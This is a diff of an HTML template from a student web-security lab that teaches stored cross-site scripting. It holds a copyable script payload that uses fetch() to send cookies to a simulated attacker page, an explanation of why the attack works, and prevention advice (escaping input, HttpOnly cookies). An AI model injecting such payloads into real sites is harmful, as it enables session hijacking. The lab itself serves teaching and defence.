@@ -1,6 +1,13 @@
+<!-- 
+    stored XSS view
+    Jan Zboril 
+    xzbori20@stud.fit.vutbr.cz
+    FIT VUT Brno 2023
+    WAP proj2
+ -->
+
 <!DOCTYPE html>
 <html lang="en" class="html">
-    <!-- <script src="/api/session-p.js" defer></script> -->
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -76,7 +83,7 @@
                                         opened in another browser. So you do not even have to try to send the link to your friends. You won't get
                                         their cookies!
                                     </p>
-<code id="post-code">
+<code id="post-code" class="my-code">
 &lt;script&gt;
 fetch(
 '<%- full_url %>/frame_attacker',
@@ -87,18 +94,38 @@ fetch(
 &lt;/script&gt;
 </code><br/>
                                     <button onclick="copyCode('post-code')">Copy code to clipboard</button>
+                                    <br/>
                                     <button class="reverse" onclick="fade(1)"> Next </button>
+                                </li>
+                                <li class="fadeMe" hidden>
+                                    <p>
+                                        If everything went well, you should see the cookie value in the attacker page.
+                                        What happened? The code you entered in the form was stored in the server's database in
+                                        an unescaped form.
+                                    </p>
+                                    <p>
+                                        When the page was loaded, the code was retrieved from the database and executed. The stolen
+                                        cookie is actually yours - of this current session. If another user visits the page, their cookie
+                                        will be send to the attacker's server.
+                                    </p>
+                                    <p>
+                                        This page only simulates the attack, so you can't break the server. If you reset the lab,
+                                        the comments are going to be cleared. The comments are actually not stored on server at all.
+                                        Only the stolen cookies is stored in the server's memory and they can be retrieved to be shown
+                                        in the attacker's page.
+                                    </p>
+                                    <button class="reverse" onclick="fade(2)"> Prevention </button>
                                 </li>
                                 <li class="fadeMe" id="li_3" hidden>
                                     <h3>Prevention</h3>
                                     <ul>
                                         <li>
                                             Properly validate all user input. Use correct escaping. Program
-                                            your own solution or use a framework that automatically escapes all user input.
+                                            your own solution to learn more, but in production, use a framework that automatically escapes all user input.
                                         </li>
                                         <li>
                                             On a server side - use the correct security parameters for cookies.
-                                            Using the <code>HttpOnly</code> flag will prevent the cookie from being accessed by JavaScript and this
+                                            Using the <code class="my-code">HttpOnly</code> flag will prevent the cookie from being accessed by JavaScript and this
                                             attack will not work. Also take a look at the other flags that can be used.
 
                                         </li>
@@ -112,20 +139,20 @@ fetch(
                                         </li>
                                     </ul>
                                     <br/>
-                                    <button class="reverse" onclick="fade(2)"> Return to start </button>
+                                    <button class="reverse" onclick="fade(3)"> Return to start </button>
                                 </li>
                             </ul>
                         </div>
                     </div>
                     <div class="xss-stored-wrapper-right">
                         <p>
-                            Vulnerable page: <code><%- full_url %>/frame</code>
+                            Vulnerable page: <code class="my-code"><%- full_url %>/frame</code>
                         </p>
                         <div class="example-frame-cls">
                             <iframe src="/xss_stored/frame" frameborder="0"></iframe>
                         </div>
                         <p>
-                            Attacker page: <code><%- full_url %>/frame_attacker</code>
+                            Attacker page: <code class="my-code"><%- full_url %>/frame_attacker</code>
                             (refreshed every 5 seconds)
                         </p>
                         <div>
